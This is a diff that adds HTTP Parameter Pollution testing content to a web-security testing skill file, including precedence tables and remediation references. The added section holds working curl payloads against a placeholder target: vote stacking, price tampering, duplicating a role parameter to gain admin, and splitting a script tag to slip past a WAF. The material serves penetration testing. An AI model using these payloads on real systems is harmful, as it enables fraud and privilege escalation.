@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: [php, asp, jsp]
 cwe_ids: [CWE-94]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-11, wstg-inpv-01]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-11: "HTTP Parameter Pollution splits/duplicates the malicious parameter to evade signature-based WAF filters, smuggling a Code Injection payload past validation = Critical (Remote Code Execution)"
 ---
 
 # wstg-inpv-04
@@ -365,6 +366,104 @@ curl -s -X POST "$TARGET" \
 
 ---
 
+## Example Commands/Payloads
+
+### Duplicate Parameter Behavior Discovery (curl)
+
+```bash
+TARGET="https://target.com/page"
+
+# GET-based duplication - inspect which value the server/back-end used
+curl -s "$TARGET?id=1&id=2" | grep -oP 'id["\s:=]+\K[0-9]+' | head -3
+
+# POST body duplication
+curl -s -X POST "$TARGET" -d "id=1&id=2"
+
+# Query string vs. POST body precedence
+curl -s -X POST "$TARGET?id=fromquery" -d "id=frombody"
+
+# Array-style duplication (PHP/Node parse these as arrays)
+curl -s "$TARGET?id[]=1&id[]=2"
+
+# JSON body with duplicate keys (parser-dependent, last-wins in most JSON libs)
+curl -s -X POST "$TARGET" -H "Content-Type: application/json" -d '{"id":"1","id":"2"}'
+```
+
+### Business-Logic Abuse via HPP
+
+```bash
+# Vote/poll manipulation - stack multiple choices if the endpoint counts each occurrence
+curl -s -X POST "https://target.com/vote" -d "poll_id=1&choice=A&choice=B&choice=C"
+
+# Price/quantity tampering - if the server (e.g. ASP.NET/IIS) takes the LAST value
+curl -s -X POST "https://target.com/checkout" -d "item=123&price=100&price=1"
+
+# Privilege escalation via duplicated role parameter
+curl -s -X POST "https://target.com/api/user" -d "id=123&role=user&role=admin" -b "session=<auth_cookie>"
+```
+
+### WAF/Filter Evasion via HPP
+
+```bash
+# Split a blocked payload across two instances of the same parameter
+curl -s "https://target.com/page?input=%3Cscript%3E&input=alert(1)%3C/script%3E"
+```
+
+### Automated Parameter Discovery
+
+```bash
+# Arjun - find hidden/duplicable parameters
+arjun -u "https://target.com/page" -m GET,POST --stable
+
+# Burp Suite ParamMiner (via extension) - use "Guess params" on the request, then
+# manually duplicate each discovered parameter to test precedence
+```
+
+### Detection Pattern
+
+| Server/Framework | Typical Precedence |
+| ----------------- | ------------------ |
+| PHP (`$_GET`/`$_POST`) | Last value wins |
+| ASP.NET / IIS | All values concatenated with `,` |
+| Apache Tomcat / Java Servlet | First value wins |
+| Node.js Express `req.query` | Returns an array — app must handle explicitly |
+| nginx (proxied) | Depends on backend; nginx itself passes all duplicates through |
+
+A finding is confirmed when the value actually consumed by the business logic (visible in response, price charged, role granted, vote counted, etc.) differs from the first parameter instance, or when a WAF-blocked payload succeeds once split across duplicate parameters.
+
+### Extended Server/Stack Precedence Table (for `?par1=a&par1=b`)
+
+| Technology | Parsing Result | Outcome |
+| --- | --- | --- |
+| ASP.NET/IIS, Classic ASP/IIS | All occurrences, comma-joined | `a,b` |
+| Golang `net/http` — `r.URL.Query().Get()` | First occurrence | `a` |
+| Golang `net/http` — `r.URL.Query()[...]` | All occurrences (array) | `['a','b']` |
+| IBM HTTP Server / Lotus Domino | First occurrence | `a` |
+| JSP/Servlet/Tomcat | First occurrence | `a` |
+| mod_wsgi (Python)/Apache, Perl CGI/Apache | First occurrence | `a` |
+| Node.js (raw query parsing) | All occurrences | `a,b` |
+| PHP/Apache, PHP/Zeus | Last occurrence | `b` |
+| Python Django | Last occurrence | `b` |
+| Python Flask | First occurrence | `a` |
+| Python/Zope | All occurrences (array) | `['a','b']` |
+| Ruby on Rails | Last occurrence | `b` |
+
+### Additional Pollution Payload Shapes
+
+```bash
+# Nested key injection
+curl -s "$TARGET?param[key1]=value1&param[key2]=value2"
+
+# Encoded ampersand smuggled inside a single param value (parser-dependent re-split)
+curl -s "$TARGET?param=value1%26other=value2"
+
+# Mixed array/scalar notation
+curl -s "$TARGET?param[]=value1&param=value2"
+curl -s "$TARGET?param=value1&param[]=value2"
+```
+
+---
+
 ## Remediation
 
 ```python
@@ -452,6 +551,7 @@ app.get("/api/action", (req, res) => {
 - [OWASP HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/)
 - [HPP Research Paper](https://www.madlab.it/slides/BHEU2011/whitepaper-bhEU2011.pdf)
 - [Web Parameter Tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering)
+- [PayloadsAllTheThings - HTTP Parameter Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution)
 
 
 ---
